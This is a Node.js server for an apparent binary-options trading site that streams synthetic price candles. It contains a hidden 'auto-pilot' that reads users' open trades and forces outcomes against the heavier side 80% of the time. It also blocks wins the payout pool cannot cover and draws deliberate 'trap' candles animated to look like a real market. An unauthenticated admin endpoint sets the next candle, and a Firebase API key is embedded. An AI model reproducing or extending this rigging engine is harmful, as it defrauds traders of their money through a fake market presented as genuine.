// --- START: server.js (v30 - Perfect Candle Pattern Animation & Auto-Pilot) ---

const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const firebase = require('firebase/app');
require('firebase/database');

// --- Anti-Crash Protection ---
process.on('uncaughtException', (err) => console.error('Uncaught Exception:', err));
process.on('unhandledRejection', (err) => console.error('Unhandled Rejection:', err));

// Firebase Configuration
const firebaseConfig = {
    apiKey: "AIzaSyBUTMFblYIVovOe4F25XCFneJNTlVcoWCA",
    authDomain: "ictex-trade.firebaseapp.com",
    databaseURL: "https://ictex-trade-default-rtdb.firebaseio.com",
    projectId: "ictex-trade",
    storageBucket: "ictex-trade.appspot.com",
    messagingSenderId: "755532704199",
    appId: "1:755532704199:web:b27d7c9e7d0f4ac76291e2"
};

if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
const db = firebase.database();

const app = express();
app.use(cors());
app.use(express.json());
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// --- SYSTEM CONSTANTS ---
const TIMEFRAME = 60000; 
const TICK_MS = 300;
const MIN_PRICE = 0.00001;
const HISTORY_SEED_COUNT = 100;
const MAX_CANDLES = 5000; // Added to prevent undefined error in array shift

// 🔥 ADMIN HIDDEN AUTO-PILOT SETTINGS 🔥
const SMART_AUTO_PILOT = true; 
const ADMIN_WIN_RATIO = 0.80;  // 80% Win Rate for Admin

// 🔥 GLOBAL REVENUE POOL SETTINGS 🔥
const POOL_CONFIG = {
    ADMIN_SHARE: 0.70, // 70% to Admin
    USER_SHARE: 0.30   // 30% to Payout Pool
};
let globalPayoutPool = 0;
let globalAdminProfit = 0;

const markets = {}; 
const activeTradesDb = {}; 

// Sync Global Pool from Firebase
db.ref('admin/revenue_pool').on('value', (snapshot) => {
    const data = snapshot.val() || {};
    globalPayoutPool = parseFloat(data.payoutPool) || 0;
    globalAdminProfit = parseFloat(data.adminProfit) || 0;
});

function updateGlobalPoolInDB(payoutChange, adminChange) {
    globalPayoutPool += payoutChange;
    globalAdminProfit += adminChange;
    
    // Ensure pools don't drop below 0
    if (globalPayoutPool < 0) globalPayoutPool = 0;
    
    db.ref('admin/revenue_pool').update({
        payoutPool: globalPayoutPool,
        adminProfit: globalAdminProfit
    }).catch(err => console.error("Pool Update Error:", err));
}

function roundPrice(v) { return parseFloat(Math.max(MIN_PRICE, v).toFixed(5)); }
function marketPathFromId(marketId) { return String(marketId || '').replace(/[\.\/ ]/g, '-').toLowerCase(); }

// --- Firebase Listeners ---
db.ref('admin/markets').on('value', (snapshot) => {
    const fbMarkets = snapshot.val() || {};
    Object.keys(fbMarkets).forEach(marketId => {
        const nodeData = fbMarkets[marketId] || {};
        
        activeTradesDb[marketId] = nodeData.activeTrades || {};

        const type = nodeData.type;
        if ((type === 'otc' || type === 'broker_real') && !markets[marketId]) {
            initializeNewMarket(marketId);
        }
    });
});

// 1. Natural Market Generation
function generateHistoricalCandle(timestamp, open, isLive = false) {
    const safeOpen = Math.max(MIN_PRICE, open);
    const isGreen = Math.random() > 0.5;
    const body = (0.00006 + Math.random() * 0.00025) * safeOpen;
    const close = isGreen ? safeOpen + body : safeOpen - body;
    const upperWick = (0.00003 + Math.random() * 0.00015) * safeOpen;
    const lowerWick = (0.00003 + Math.random() * 0.00015) * safeOpen;

    const finalHigh = Math.max(safeOpen, close) + upperWick;
    const finalLow = Math.min(safeOpen, close) - lowerWick;

    if (!isLive) {
        return { timestamp, open: roundPrice(safeOpen), high: roundPrice(finalHigh), low: roundPrice(finalLow), close: roundPrice(close) };
    }

    return {
        timestamp, open: roundPrice(safeOpen), high: roundPrice(safeOpen), low: roundPrice(safeOpen), close: roundPrice(safeOpen),
        isPredetermined: true, isNatural: true, targetHigh: roundPrice(finalHigh), targetLow: roundPrice(finalLow), targetClose: roundPrice(close), pattern: 'NORMAL'
    };
}

// 2. Exact Pattern Generator (FIXED WICK MATH)
function generateDynamicCandle(timestamp, open, command) {
    let bodySize, upperWick, lowerWick, close, high, low;
    const volatility = open * (0.00008 + Math.random() * 0.0001);

    switch (command) {
        case 'GREEN': 
            bodySize = volatility; close = open + bodySize; upperWick = volatility * 0.5; lowerWick = volatility * 0.5; break;
        case 'RED': 
            bodySize = volatility; close = open - bodySize; upperWick = volatility * 0.5; lowerWick = volatility * 0.5; break;
        case 'BULLISH_MARUBOZU': 
            bodySize = volatility * 3; close = open + bodySize; upperWick = 0; lowerWick = 0; break;
        case 'BEARISH_MARUBOZU': 
            bodySize = volatility * 3; close = open - bodySize; upperWick = 0; lowerWick = 0; break;
        case 'GREEN_HAMMER': 
            bodySize = volatility * 0.3; close = open + bodySize; upperWick = 0; lowerWick = volatility * 2.5; break;
        case 'RED_HAMMER': 
            bodySize = volatility * 0.3; close = open - bodySize; upperWick = 0; lowerWick = volatility * 2.5; break;
        case 'GREEN_SHOOTING_STAR': 
            bodySize = volatility * 0.3; close = open + bodySize; upperWick = volatility * 2.5; lowerWick = 0; break;
        case 'RED_SHOOTING_STAR': 
            bodySize = volatility * 0.3; close = open - bodySize; upperWick = volatility * 2.5; lowerWick = 0; break;
        case 'DOJI': 
            bodySize = open * 0.000002; close = Math.random() > 0.5 ? open + bodySize : open - bodySize; upperWick = volatility; lowerWick = volatility; break;
        case 'LONG_LEGGED_DOJI': 
            bodySize = open * 0.000002; close = Math.random() > 0.5 ? open + bodySize : open - bodySize; upperWick = volatility * 3; lowerWick = volatility * 3; break;
        case 'DRAGONFLY_DOJI': 
            bodySize = open * 0.000002; close = open + bodySize; upperWick = 0; lowerWick = volatility * 2.5; break;
        case 'GRAVESTONE_DOJI': 
            bodySize = open * 0.000002; close = open - bodySize; upperWick = volatility * 2.5; lowerWick = 0; break;
        case 'GREEN_SPINNING_TOP': 
            bodySize = volatility * 0.4; close = open + bodySize; upperWick = volatility * 1.5; lowerWick = volatility * 1.5; break;
        case 'RED_SPINNING_TOP': 
            bodySize = volatility * 0.4; close = open - bodySize; upperWick = volatility * 1.5; lowerWick = volatility * 1.5; break;
        case 'HUGE_PUMP': 
            bodySize = volatility * 5; close = open + bodySize; upperWick = volatility * 0.2; lowerWick = volatility * 0.2; break;
        case 'HUGE_DUMP': 
            bodySize = volatility * 5; close = open - bodySize; upperWick = volatility * 0.2; lowerWick = volatility * 0.2; break;
        default: 
            bodySize = volatility; close = command === 'RED' ? open - bodySize : open + bodySize; upperWick = volatility * 0.5; lowerWick = volatility * 0.5;
    }
    
    high = Math.max(open, close) + upperWick;
    low = Math.min(open, close) - lowerWick;

    return {
        timestamp, open: roundPrice(open), high: roundPrice(open), low: roundPrice(open), close: roundPrice(open),
        isPredetermined: true, isNatural: false, targetHigh: roundPrice(high), targetLow: roundPrice(low), targetClose: roundPrice(close), pattern: command
    };
}

async function initializeNewMarket(marketId) {
    const path = marketPathFromId(marketId);
    let startPrice = 1.15;

    try {
        const liveSnap = await db.ref(`markets/${path}/live`).once('value');
        if (liveSnap.val()?.price) startPrice = liveSnap.val().price;
    } catch (e) {}

    const nowPeriod = Math.floor(Date.now() / TIMEFRAME) * TIMEFRAME;
    const candles = [];
    let currentPrice = startPrice;

    for (let i = HISTORY_SEED_COUNT; i > 0; i--) {
        const c = generateHistoricalCandle(nowPeriod - (i * TIMEFRAME), currentPrice, false); 
        candles.push(c);
        currentPrice = c.close;
    }

    markets[marketId] = { marketId, marketPath: path, history: candles, currentPrice: currentPrice, lastMove: 0 };
}

// 🔥 CORE LOGIC: Controls Candle Output
function ensureCurrentPeriodCandle(marketData, currentPeriod) {
    let lastCandle = marketData.history[marketData.history.length - 1];
    if (!lastCandle) return null;

    if (currentPeriod > lastCandle.timestamp) {
        let newCandle;
        
        // Priority 1: Immediate Next Candle Command (from API)
        if (marketData.nextCandleCommand) {
            newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, marketData.nextCandleCommand);
            console.log(`[ADMIN CMD] ${marketData.marketId} Set to: ${marketData.nextCandleCommand}`);
            marketData.nextCandleCommand = null;
        } 
        
        // Priority 2: Smart Auto-Pilot (Hidden from Panel, operates in Backend)
        if (!newCandle && SMART_AUTO_PILOT) {
            const trades = activeTradesDb[marketData.marketId] || {};
            let immediateUpVol = 0, immediateDownVol = 0;
            let immediateUpPayout = 0, immediateDownPayout = 0;
            let futureUpVol = 0, futureDownVol = 0;
            const nextPeriod = currentPeriod + TIMEFRAME;
            
            Object.values(trades).forEach(t => {
                const isDemo = t.isDemo === true; 
                const payoutRate = t.payoutRate || 1.85;
                const expectedPayout = t.amount * payoutRate;

                // Process Real Trades Only for Pool Calculation
                if (!isDemo && !t.isProcessedForPool) {
                    const adminCut = t.amount * POOL_CONFIG.ADMIN_SHARE;
                    const userCut = t.amount * POOL_CONFIG.USER_SHARE;
                    updateGlobalPoolInDB(userCut, adminCut);
                    
                    // Mark as processed so we don't calculate the same trade twice
                    t.isProcessedForPool = true;
                    db.ref(`admin/markets/${marketData.marketId}/activeTrades/${t.id}/isProcessedForPool`).set(true).catch(()=>{});
                }

                // Check if trade expires at the end of this upcoming candle (Immediate Threat)
                if (t.expiryTimestamp && t.expiryTimestamp <= nextPeriod + 2000) {
                    if (t.direction === 'UP') {
                        immediateUpVol += t.amount;
                        if (!isDemo) immediateUpPayout += expectedPayout;
                    }
                    if (t.direction === 'DOWN') {
                        immediateDownVol += t.amount;
                        if (!isDemo) immediateDownPayout += expectedPayout;
                    }
                } else {
                    // Trades expiring in the future (Drift / Safety Zone calculation)
                    if (t.direction === 'UP') futureUpVol += t.amount;
                    if (t.direction === 'DOWN') futureDownVol += t.amount;
                }
            });

            // Rule 1: Conflict Resolution - Real Payout Pool Check
            if (immediateUpVol > 0 || immediateDownVol > 0) {
                let targetDirection = 'DOJI';

                // Check if UP wins, can we pay?
                const canAffordUp = immediateUpPayout <= globalPayoutPool;
                // Check if DOWN wins, can we pay?
                const canAffordDown = immediateDownPayout <= globalPayoutPool;

                if (!canAffordUp && !canAffordDown) {
                    // Disaster Scenario: Cannot afford either side (very rare). Force the lesser loss.
                    targetDirection = immediateUpPayout > immediateDownPayout ? 'RED' : 'GREEN';
                } else if (!canAffordUp) {
                    // Cannot afford UP win, MUST close DOWN
                    targetDirection = 'RED';
                } else if (!canAffordDown) {
                    // Cannot afford DOWN win, MUST close UP
                    targetDirection = 'GREEN';
                } else {
                    // Can afford both. Let's apply standard logic. Force larger volume to lose 80% of the time.
                    if (Math.random() < ADMIN_WIN_RATIO) {
                        targetDirection = immediateUpVol > immediateDownVol ? 'RED' : 'GREEN';
                    } else {
                        // Let the users win naturally
                        targetDirection = immediateUpVol > immediateDownVol ? 'GREEN' : 'RED';
                    }
                }

                newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, targetDirection);
                newCandle.targetClose += (Math.random() - 0.5) * (lastCandle.close * 0.00005);
                
                // Deduct payout from pool instantly if users are about to win
                const finalWinningPayout = targetDirection === 'GREEN' ? immediateUpPayout : (targetDirection === 'RED' ? immediateDownPayout : 0);
                if (finalWinningPayout > 0) {
                    updateGlobalPoolInDB(-finalWinningPayout, 0); // Remove winning amount from pool
                }

                console.log(`[AUTO-PILOT IMMEDIATE] Pool: $${globalPayoutPool.toFixed(2)}. U-Pay: $${immediateUpPayout} D-Pay: $${immediateDownPayout}. Forcing ${targetDirection}`);
            } 
            // Rule 2: Continuous Safety Drift - No immediate threat, shift to safety for future trades
            else if (futureUpVol > 0 || futureDownVol > 0) {
                const driftTarget = futureUpVol > futureDownVol ? 'DOWN' : 'UP';
                
                // Natural Wave Generation (Zig-Zag towards safety)
                const rand = Math.random();
                let driftCommand = 'DOJI';
                
                if (driftTarget === 'DOWN') {
                    if (rand < 0.50) driftCommand = 'RED'; // 50% normal red
                    else if (rand < 0.70) driftCommand = 'RED_SHOOTING_STAR'; // 20% bearish rejection
                    else if (rand < 0.85) driftCommand = 'GREEN_HAMMER'; // 15% fake green hope (Trap)
                    else driftCommand = 'DOJI'; // 15% consolidation
                } else {
                    if (rand < 0.50) driftCommand = 'GREEN'; // 50% normal green
                    else if (rand < 0.70) driftCommand = 'GREEN_HAMMER'; // 20% bullish rejection
                    else if (rand < 0.85) driftCommand = 'RED_SHOOTING_STAR'; // 15% fake red hope (Trap)
                    else driftCommand = 'DOJI'; // 15% consolidation
                }

                newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, driftCommand);
                newCandle.targetClose += (Math.random() - 0.5) * (lastCandle.close * 0.00005);
                console.log(`[AUTO-PILOT DRIFT] Future U:${futureUpVol} D:${futureDownVol}. Drifting ${driftTarget} via ${driftCommand}`);
            }
        }
        
        // Priority 3: Fallback to Natural Market
        if (!newCandle) {
            newCandle = generateHistoricalCandle(currentPeriod, lastCandle.close, true);
        }

        marketData.history.push(newCandle);
        if (marketData.history.length > MAX_CANDLES) marketData.history.shift();
        return newCandle;
    }
    return lastCandle;
}

// 🔥 TICK ENGINE: Fixed Wick Animation Math 🔥
function updateRealisticPrice(marketData, candle, currentPeriod) {
    if (!candle.isPredetermined) return;

    const now = Date.now();
    const timeElapsed = Math.max(0, now - currentPeriod);
    const progress = Math.min(timeElapsed / TIMEFRAME, 1.0);

    let idealPrice = candle.open;
    const pattern = candle.pattern || 'NORMAL';

    // To draw proper wicks, the live price MUST visit the targetHigh and targetLow 
    // before settling at the targetClose. This logic forces it.
    if (pattern.includes('HAMMER') || pattern === 'DRAGONFLY_DOJI') {
        // Drop deep down first, then recover
        if (progress < 0.6) {
            idealPrice = candle.open - (candle.open - candle.targetLow) * (progress / 0.6);
        } else {
            idealPrice = candle.targetLow + (candle.targetClose - candle.targetLow) * ((progress - 0.6) / 0.4);
        }
    } 
    else if (pattern.includes('SHOOTING_STAR') || pattern === 'GRAVESTONE_DOJI') {
        // Pump high up first, then crash down
        if (progress < 0.6) {
            idealPrice = candle.open + (candle.targetHigh - candle.open) * (progress / 0.6);
        } else {
            idealPrice = candle.targetHigh - (candle.targetHigh - candle.targetClose) * ((progress - 0.6) / 0.4);
        }
    }
    else if (pattern.includes('DOJI') || pattern.includes('SPINNING_TOP')) {
        // Go up, go down, settle in middle
        if (progress < 0.3) idealPrice = candle.open + (candle.targetHigh - candle.open) * (progress / 0.3);
        else if (progress < 0.7) idealPrice = candle.targetHigh - (candle.targetHigh - candle.targetLow) * ((progress - 0.3) / 0.4);
        else idealPrice = candle.targetLow + (candle.targetClose - candle.targetLow) * ((progress - 0.7) / 0.3);
    }
    else {
        // Normal, Marubozu, Pump, Dump (Smooth transition)
        const easeProgress = 1 - Math.pow(1 - progress, 3);
        idealPrice = candle.open + (candle.targetClose - candle.open) * easeProgress;
    }

    // Add Diminishing Noise
    const noiseFactor = 1 - Math.pow(progress, 2); 
    const volatility = candle.open * 0.00005;
    const noise = (Math.random() - 0.5) * volatility * noiseFactor;

    marketData.currentPrice = idealPrice + noise;

    // Strict Boundaries
    marketData.currentPrice = Math.min(marketData.currentPrice, candle.targetHigh);
    marketData.currentPrice = Math.max(marketData.currentPrice, candle.targetLow);

    // Final Lock
    if (timeElapsed >= TIMEFRAME - 1500) {
        marketData.currentPrice = candle.targetClose;
    }

    candle.close = roundPrice(marketData.currentPrice);
    candle.high = roundPrice(Math.max(candle.high, candle.close, candle.open));
    candle.low = roundPrice(Math.min(candle.low, candle.close, candle.open));
}

function broadcastCandle(marketId, candle) {
    const payload = JSON.stringify({ market: marketId, candle, serverTime: Date.now() });
    wss.clients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN && client.subscribedMarket === marketId) {
            client.send(payload);
        }
    });
}

wss.on('connection', (ws) => {
    ws.on('message', (raw) => {
        try {
            const msg = JSON.parse(raw.toString());
            if (msg?.type === 'subscribe') {
                ws.subscribedMarket = msg.market;
                if (markets[msg.market]) {
                    ws.send(JSON.stringify({ type: 'history', market: msg.market, candles: markets[msg.market].history.slice(-300) }));
                }
            }
        } catch (_) {}
    });
});

app.get('/api/history/:marketId', (req, res) => {
    const marketId = req.params.marketId;
    if (markets[marketId] && markets[marketId].history) {
        res.json(markets[marketId].history);
    } else {
        res.status(404).json({ error: 'Market not found' });
    }
});

// --- REST API ENDPOINT ---
app.post('/api/admin/command', (req, res) => {
    const { marketId, command } = req.body;
    if (!marketId || !command) {
        return res.status(400).json({ error: 'Missing marketId or command' });
    }
    if (markets[marketId]) {
        markets[marketId].nextCandleCommand = command;
        console.log(`[API] Admin commanded Next Candle for ${marketId} to be ${command}`);
        res.json({ success: true, message: `Command ${command} received` });
    } else {
        res.status(404).json({ error: 'Market not found on server' });
    }
});

// Main Loop
let lastSyncTime = 0;
setInterval(() => {
    const now = Date.now();
    const currentPeriod = Math.floor(now / TIMEFRAME) * TIMEFRAME;

    for (const marketId in markets) {
        const marketData = markets[marketId];
        let candle = ensureCurrentPeriodCandle(marketData, currentPeriod);
        if (!candle) continue;

        updateRealisticPrice(marketData, candle, currentPeriod); 
        broadcastCandle(marketId, candle);
    }

    // Sync Live Price to Firebase every 1.5 seconds for Admin Panel
    if (now - lastSyncTime > 1500) {
        lastSyncTime = now;
        const batchUpdates = {};
        for (const marketId in markets) {
            const m = markets[marketId];
            if (m.currentPrice) {
                batchUpdates[`markets/${m.marketPath}/live`] = { price: m.currentPrice, timestamp: Date.now() };
            }
        }
        if (Object.keys(batchUpdates).length > 0) db.ref().update(batchUpdates).catch(()=>{});
    }
}, TICK_MS);

app.get('/ping', (_req, res) => res.send('Server V30 - Perfect Animations Active'));
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on ${PORT}`));